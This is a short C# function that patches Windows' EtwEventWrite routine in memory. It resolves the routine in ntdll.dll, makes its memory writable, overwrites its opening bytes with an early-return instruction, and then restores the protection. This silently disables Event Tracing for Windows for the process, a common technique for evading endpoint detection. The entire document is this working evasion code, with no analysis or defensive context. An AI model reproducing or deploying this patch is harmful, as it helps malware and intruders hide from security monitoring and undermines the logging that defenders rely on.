internal static void PatchEtwEventWrite()
{
	bool result;
	var hook = new byte[] { 0xc2, 0x14, 0x00, 0x00 };
	var address = GetProcAddress(LoadLibrary("ntdll.dll"), "EtwEventWrite");
        result = VirtualProtect(address, (UIntPtr)hook.Length, (uint)MemoryProtectionConsts.EXECUTE_READWRITE, out uint oldProtect);
	Marshal.Copy(hook, 0, address, hook.Length);
	result = VirtualProtect(address, (UIntPtr)hook.Length, oldProtect, out uint blackhole);
}
